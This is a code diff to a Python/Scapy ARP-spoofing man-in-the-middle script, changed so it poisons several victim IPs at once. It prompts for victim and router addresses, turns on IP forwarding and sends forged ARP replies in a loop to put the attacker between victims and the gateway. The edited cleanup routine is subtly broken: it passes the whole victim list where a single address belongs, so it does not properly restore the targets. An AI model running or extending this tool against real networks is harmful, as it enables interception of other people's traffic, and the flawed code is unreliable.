@@ -3,7 +3,7 @@ import sys, os, time
 
 try:
 	interface = input("[*] Enter desired interface :")
-	victim_ip = input("[*] Enter Victim IP :")
+	victim_ip = list(input("[*] Enter Victim IP :").split(" "))
 	gate_ip = input("[*] Enter Router IP :")
 except KeyboardInterrupt:
 	print("\n[*] User requested shutdown")
@@ -24,25 +24,29 @@ def getMac(IP):
 
 def reARP():
 	print("[*] Restoring Targets")
-	victim_mac = getMac(victim_ip)
 	gate_mac = getMac(gate_ip)
-	send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, 
-		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
-	send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, 
-		hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
+	for v in victim_ip:
+		victim_mac = getMac(victim_ip)
+		send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, 
+			hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=7)
+		send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, 
+			hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gate_mac), count=7)
 	print("[*] Disabling IP forwarding")
 	os.system("sudo sysctl -w net.inet.ip.forwarding=0")
 	print("[*] Shutting Down....")
 	sys.exit(1)
 
-def trick(gm, vm):
-	send(ARP(op=2, pdst=victim_ip, psrc=gate_ip, hwdst= vm))
-	send(ARP(op=2, pdst=gate_ip, psrc=victim_ip, hwdst= gm))
+def trick(gm, vm, vip, gip):
+	send(ARP(op=2, pdst=vip, psrc=gip, hwdst= vm))
+	send(ARP(op=2, pdst=gip, psrc=vip, hwdst= gm))
 
 
 def mitm():
 	try:
-		victim_mac = getMac(victim_ip)
+		victim_macs = []
+		for v in victim_ip:
+			victim_macs.append(getMac(v))
+
 	except Exception as e:
 		print(str(e))
 		os.system("sudo sysctl -w net.inet.ip.forwarding=0")
@@ -60,7 +64,8 @@ def mitm():
 	print("[*] Poisoning targets.....")
 	while 1:
 		try:
-			trick(gate_mac, victim_mac)
+			for i in range(len(victim_macs)):
+				trick(gate_mac, victim_macs[i], victim_ip[i], gate_ip)
 			time.sleep(1)
 		except KeyboardInterrupt:
 			reARP()
